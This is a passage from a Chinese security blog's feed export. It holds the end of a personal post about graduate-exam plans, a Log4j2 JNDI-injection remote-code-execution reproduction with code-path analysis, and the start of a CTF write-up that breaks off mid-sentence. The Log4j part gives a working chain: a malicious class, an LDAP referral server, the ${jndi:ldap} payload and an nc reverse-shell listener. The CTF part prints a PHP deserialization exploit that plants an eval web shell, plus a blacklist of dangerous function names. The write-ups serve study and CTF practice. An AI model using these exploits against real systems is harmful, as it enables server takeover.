start="5"><li>付出与收获</li></ol><p>有些时候有人会说“年轻就是要冲一冲，不让我做以后还是会后悔，做了失败了也就释然了”。但考研没那么简单，虽然是个小决定，拼一拼不仅拼的是自己的一年时间，考上了还要包含读研的时间，考不上就还要包含个人的未来方向，还有包括家庭&#x2F;配偶，以及家庭情况(资本)能不能支撑我考研等等。</p><p>5b6I5aSa5aSn5Y6C5LiN6KaB6ICD56CU5LqM5oiY5aSx6LSl55qE77yM55Sa6Iez5Y+v6IO95LuO5YOP5oiR5LiA5qC35pmu6YCa5pys56eR5Ye65p2l77yM6ICD56CU5aSx6LSl55qE6YO95b6I6Zq+5YaN6L+b5aSn5Y6C5LqG44CC5q+V56uf6L+Z5p2h6Lev5b6I5Ye26Zmp77yM6ICD56CU5ZKM5bel5L2c6YO95piv5aaC5q2k</p><ol start="6"><li>动力</li></ol><p>考研的动力很大程度上决定能不能考上研，毕竟动力驱动行动，说白了就是考研为了什么？以我们学校为例，计算机院我们这届一共大概五百到六百人，我们这届考研群(学校官方的)内就有近三百人了。这三百人 有学了三年没学到东西所以想考研碰运气的，有想搏一搏说不定就能碰上的，有被家里面逼迫的，有逃避就业的。大家都知道考研好，毕竟学历比本科高了一个层次，那这么多人考研真的是想去做研究，想为了自己的目标努力奋斗，还是没有目标也知道自己找不到工作所以再苟一年说是准备考研得过且过。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写这篇文章前没有任何考研打算，现在反而纠结了…我物色了一些好的院校，专业分数都是很低的，但是毕竟还是看专业走，而且我的目的也只是提升下我现在的目前学历，没打算冲击名校，所以压力会小点。但我的校内情况是最棘手的方面，我不能轻易做出决定。</p><p>如果我以后更新了会在下面用分割线或者直接在内容里更新的，写这篇文章原本是为了说明下我个人考研的算法，可我现在却纠结了，实在抱歉，如果这篇文章对你有任何帮助也请不要吝啬你的想法，可以在底下评论告诉我，如果有任何建议和想说的话也可以评论，这篇文章的评论我会一一阅读回复的，感谢大家。</p><p>差不多就这样。</p><hr><p>12月26日：考研差不多快结束了，学校里又少了不少人</p><p>今年的英语翻译很有意境。</p><p>即便尽其所能，亦未必如初愿。如举笔画物，光有明暗，画制于材，技艺有所不能，虽心之所愿，然下笔仍有憾。</p><hr><p>年后更新：博主决定要好好学习技术了，可能对我来说考研也是为了找工作，这段时间也参考了很多其他师傅的想法，我觉得我个人还是希望在工作中体现自我价值，所以说决定继续学习技术，争取进一个大厂。也期望所有的同学们能够不负韶华，尽己所能，坚持自己的道路，祝好！</p><hr><p>4月更新：金三银四，金三已经过去了，很不幸在我第一次找实习就遇到了互联网寒冬，各单位大裁员，缩紧hc，很难，调整调整心态吧。上面补充了一些新内容，也是最近最新的感悟。</p><hr><h2 id="最后更新-2022年4月8日"><a href="#最后更新-2022年4月8日" class="headerlink" title="最后更新 2022年4月8日"></a>最后更新 2022年4月8日</h2>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2 RCE漏洞代码浅析</title>
      <link href="article/log4jrce/"/>
      <url>article/log4jrce/</url>
      
        <content type="html"><![CDATA[<p>开摸</p><span id="more"></span><img src="/article/log4jrce/4E32FA68A576C51928C018DCF51FA1C9.jpg" class="" title="4E32FA68A576C51928C018DCF51FA1C9" loading="lazy"><p>Log4j2是一个基于Java的日志框架，Apache Log4j的重构版本。新增的 Lookups 方法设计用于通过多种途径动态引入外部变量，log4j2版本 &lt; log4j-2.15.0-rc2 可由JNDI注入实现远程代码执行。</p><p>转载请注明本文作者和地址。</p><hr><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>新建maven项目</p><img src="/article/log4jrce/image-20211210205230894.png" class="" title="image-20211210205230894" loading="lazy"><h3 id="创建完后"><a href="#创建完后" class="headerlink" title="创建完后"></a>创建完后</h3><img src="/article/log4jrce/image-20211210205154269.png" class="" title="image-20211210205154269" loading="lazy"><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><pre class="language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;&lt;artifactId&gt;log4j-core&lt;&#x2F;artifactId&gt;&lt;version&gt;2.14.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.apache.logging.log4j&#x2F;log4j-api --&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;&lt;artifactId&gt;log4j-api&lt;&#x2F;artifactId&gt;&lt;version&gt;2.14.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;</code></pre><img src="/article/log4jrce/image-20211210205406063.png" class="" title="image-20211210205406063" loading="lazy"><h3 id="新建两个class"><a href="#新建两个class" class="headerlink" title="新建两个class"></a>新建两个class</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token comment">/* *    @Author: Err0r *    @date : 2021/12/10 *    @file : log4j */</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> log4j <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4j<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"$&#123;jndi:ldap://127.0.0.1:1389/Log4jRCE&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token comment">/* *    @Author: Err0r *    @date : 2021/12/10 *    @file : Log4jRCE */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jRCE</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> var0 <span class="token operator">=</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><img src="/article/log4jrce/image-20211210210755065.png" class="" title="image-20211210210755065" loading="lazy"><h3 id="开启http服务"><a href="#开启http服务" class="headerlink" title="开启http服务"></a>开启http服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8888</span></code></pre><img src="/article/log4jrce/image-20211210210848125.png" class="" title="image-20211210210848125" loading="lazy"><h3 id="到一个新的文件夹准备服务"><a href="#到一个新的文件夹准备服务" class="headerlink" title="到一个新的文件夹准备服务"></a>到一个新的文件夹准备服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git@github.com:mbechler/marshalsec.git</code></pre><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><pre class="language-bash" data-language="bash"><code class="language-bash">mvn clean package <span class="token parameter variable">-DskipTests</span></code></pre><h3 id="上服务"><a href="#上服务" class="headerlink" title="上服务"></a>上服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://127.0.0.1:8888/#Log4jRCE"</span></code></pre><img src="/article/log4jrce/image-20211210211207737.png" class="" title="image-20211210211207737" loading="lazy"><p>运行log4j.java</p><img src="/article/log4jrce/image-20211210212715616.png" class="" title="image-20211210212715616" loading="lazy"><h2 id="0x02-流程分析"><a href="#0x02-流程分析" class="headerlink" title="0x02 流程分析"></a>0x02 流程分析</h2><p>菜鸡蹩脚调试了半天，不知是否正确，还请大师傅们批评指正。</p><p>首先是一系列初始化操作，然后是我们的poc作为message传入<code>logMessage</code>(AbstractLogger.java)</p><img src="/article/log4jrce/image-20211210213200746.png" class="" title="image-20211210213200746" loading="lazy"><img src="/article/log4jrce/image-20211210213243728.png" class="" title="image-20211210213243728" loading="lazy"><p>然后进入<code>logMessageSafely</code></p><img src="/article/log4jrce/image-20211210213339178.png" class="" title="image-20211210213339178" loading="lazy"><p>接着进入<code>logMessageTrackRecursion</code></p><img src="/article/log4jrce/image-20211210213713378.png" class="" title="image-20211210213713378" loading="lazy"><p>指向<code>tryLogMessage</code></p><img src="/article/log4jrce/image-20211210213738925.png" class="" title="image-20211210213738925" loading="lazy"><p>再走到LoggerConfig的<code>log</code></p><img src="/article/log4jrce/image-20211210214044470.png" class="" title="image-20211210214044470" loading="lazy"><p>由<code>processLogEvent</code>来判定Event</p><img src="/article/log4jrce/image-20211210214104131.png" class="" title="image-20211210214104131" loading="lazy"><img src="/article/log4jrce/image-20211210214154131.png" class="" title="image-20211210214154131" loading="lazy"><p>在一系列跟进后发现了个<code>toSerializable</code>，里面用了它的format方法</p><img src="/article/log4jrce/image-20211210214359815.png" class="" title="image-20211210214359815" loading="lazy"><p>里面会对首尾判断是否满足<code>$&#123;xxx&#125;</code>逻辑</p><blockquote><p>&#x2F;&#x2F; TODO can we optimize this? 很皮啊</p></blockquote><p>然后进入了<code>replace</code>,<code>substitute</code></p><img src="/article/log4jrce/image-20211210214639781.png" class="" title="image-20211210214639781" loading="lazy"><img src="/article/log4jrce/image-20211210214738016.png" class="" title="image-20211210214738016" loading="lazy"><p>调用了<code>StrSubtitutor</code>的<code>resolveVariable</code></p><img src="/article/log4jrce/image-20211210214846121.png" class="" title="image-20211210214846121" loading="lazy"><p>通过resolveVariable调用<code>lookup</code></p><img src="/article/log4jrce/image-20211210214939264.png" class="" title="image-20211210214939264" loading="lazy"><p>顺便研究一下<code>lookup</code></p><p>这里</p><pre class="language-none"><code class="language-none">prefix &#x3D; &quot;jndi&quot;name &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;lookup &#x3D; &#123;JndiLookup@2064&#125; </code></pre><p>这里从<code>strLookupMap</code>的map里提取了jndi的lookup，然后在jndi的lookup方法里成功开花</p><img src="/article/log4jrce/image-20211210222546722.png" class="" title="image-20211210222546722" loading="lazy"><p><code>return Objects.toString(jndiManager.lookup(jndiName), null)</code></p><p>这里就是<code>jndiManager.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p><img src="/article/log4jrce/image-20211210222738049.png" class="" title="image-20211210222738049" loading="lazy"><img src="/article/log4jrce/image-20211210222850555.png" class="" title="image-20211210222850555" loading="lazy"><pre class="language-none"><code class="language-none">return super.lookup(var1)</code></pre><p>也就是<code>super.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p><img src="/article/log4jrce/image-20211210223114820.png" class="" title="image-20211210223114820" loading="lazy"><pre class="language-none"><code class="language-none">var1 &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;var2 (slot_2) &#x3D; &#123;ResolveResult@2676&#125; var3 (slot_3) &#x3D; &#123;LdapCtx@2677&#125; </code></pre><p>var2获取remote的class，即跳转到了我们之前编译的<code>Log4jRCE.class</code></p><img src="/article/log4jrce/image-20211210223755936.png" class="" title="image-20211210223755936" loading="lazy"><p>var3实例化，接着var3lookup，加载</p><img src="/article/log4jrce/image-20211210223337687.png" class="" title="image-20211210223337687" loading="lazy"><p>然后就不必多说了，直接执行，遍地开花</p><img src="/article/log4jrce/image-20211210223411156.png" class="" title="image-20211210223411156" loading="lazy"><hr><h2 id="0x03-题目"><a href="#0x03-题目" class="headerlink" title="0x03 题目"></a>0x03 题目</h2><p>在12月10日晚间 <a href="https://ctf.show/challenges#Log4j%E5%A4%8D%E7%8E%B0-1730">ctfshow</a>也上线了该漏洞的复现，利用思路如上，直接拿编译好的jar文件打</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-C</span> <span class="token string">"[payload]"</span></code></pre><p>记得payload最好base64编码一下，以免出错。</p><p>其实在今年早些时候V&amp;Nctf有道题也是<code>JNDI-Injection-Exploit</code></p><p><a href="https://err0r.top/article/VN2021ctf/?highlight=realezjvav">V&amp;N ctf realezjvav</a></p><blockquote><p>不能说极其相似，只能说一摸一样，今年上半年都有ctf题目了</p><p>一个没被重视的洞，甚至没有CVE编号，终究还是扩大到了堪比永恒之蓝的范围…</p></blockquote><p>我发现我服务器上竟然还有源码，直接打就行了</p><img src="/article/log4jrce/image-20211210224236428.png" class="" title="image-20211210224236428" loading="lazy"><h3 id="1-服务器先起监听"><a href="#1-服务器先起监听" class="headerlink" title="1.服务器先起监听"></a>1.服务器先起监听</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">1234</span></code></pre><img src="/article/log4jrce/image-20211210224502476.png" class="" title="image-20211210224502476" loading="lazy"><h3 id="2-起服务"><a href="#2-起服务" class="headerlink" title="2.起服务"></a>2.起服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-C</span> <span class="token string">"[payload]"</span></code></pre><img src="/article/log4jrce/image-20211210224916380.png" class="" title="image-20211210224916380" loading="lazy"><h3 id="3-干它"><a href="#3-干它" class="headerlink" title="3.干它"></a>3.干它</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">[</span>ip<span class="token punctuation">]</span><span class="token operator">:</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token operator">/</span><span class="token punctuation">[</span>xxxx<span class="token punctuation">]</span>&#125;</span></code></pre><img src="/article/log4jrce/image-20211210224949536.png" class="" title="image-20211210224949536" loading="lazy"><p>直接弹到shell</p><img src="/article/log4jrce/image-20211210225033795.png" class="" title="image-20211210225033795" loading="lazy"><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p><p><a href="https://github.com/udoless/apache-log4j-rce-poc">https://github.com/udoless/apache-log4j-rce-poc</a></p><p>转载请注明本文作者和地址</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021祥云杯</title>
      <link href="article/2021xyb/"/>
      <url>article/2021xyb/</url>
      
        <content type="html"><![CDATA[<p>记录一下，祥云杯的wp</p><span id="more"></span><p>个人的最好成绩，web差一题ak了，当然题目也很简单就是啦。我主要是负责web方面的解题，队伍的wp也会在下面放出。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><p>题目打开写的很清楚，较新的链子，看了下是<a href="https://xz.aliyun.com/t/9948">yii2.0.42的1day漏洞</a></p><img src="/article/2021xyb/image-20210903132707299.png" class="" title="image-20210903132707299" loading="lazy"><p>原理不过多分析了，学弟在赛后写了个<a href="https://lxscloud.top/2021/08/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%9E%84%E9%80%A0POP%E9%93%BE/">分析</a>挺详细的，可以看看（学弟tql）</p><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>AppendStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span>  <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$output</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AppendStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jiang'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AppendStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$streams</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$seekable</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">streams</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CachingStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">CachingStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$remoteStream</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">remoteStream</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">stream</span><span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">PumpStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">PumpStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$source</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$buffer</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">buffer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"closure/autoload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//            $a = function()&#123;phpinfo();&#125;;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>Opis<span class="token punctuation">\</span>Closure<span class="token punctuation">\</span>serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>直接可以命令执行</p><img src="/article/2021xyb/image.png" class="" title="image" loading="lazy"><p>直接拿flag</p><hr><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><p><small>这题是完全是个人凭感觉自己做出来的，很欣慰，可惜没抢到血分</small></p><p>界面很花哨，随便登陆即可</p><p>看一下登陆的包</p><p>要跟随一个302跳转才能进去，检测网址过滤了file、flag关键字。</p><p>输入网址发现进了check2.php，根据报错得知是<code>file_get_contents($_POST[&#39;url1&#39;]);</code>这样的形式根据扫目录得到的结果，存在admin目录</p><p>直接访问会被403，所以利用检测网站打ssrf，检测然后预览看，打<code>http://127.0.0.1/admin/</code>，可以发现开启了目录遍历</p><img src="/article/2021xyb/image-20210903134546557.png" class="" title="image-20210903134546557" loading="lazy"><p>发现目录下有<code>include123.php</code>文件，读取得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"|file_put_content|file_get_content|fwrite|curl|system|eval|assert"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span><span class="token string double-quoted-string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span><span class="token string double-quoted-string">"|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span><span class="token string double-quoted-string">"|file|dict|gopher"</span><span class="token punctuation">;</span><span class="token comment">//累了累了，饮茶先</span><span class="token variable">$vpattern</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token variable">$pattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$value</span></span>/i"</span><span class="token punctuation">,</span> <span class="token variable">$u</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"检测到恶意字符"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>出题人真的苟，这么长一段黑名单，审查源码，可以读<code>/etc/passwd</code> 。但是ban了很多函数看上去根本不是想给机会rce。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>仔细观察发现</p><p> 1.文件包含include </p><p> 2.u变量可控 </p><p> 3.可以任意文件读取使用了session，所以默认<code>/tmp/sess_id</code> 会存有session的信息，读取id对应的session发现存在</p><p>于是想到<code>PHP_SESSION_UPLOAD_PROGRESS漏洞</code></p><blockquote><p>php的session.use_strict_mode默认值为0，此时用户是可以自己定义Session ID的。<br>比如，我们在Cookie里设置PHPSESSID&#x3D;flag，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_flag（还有可能在 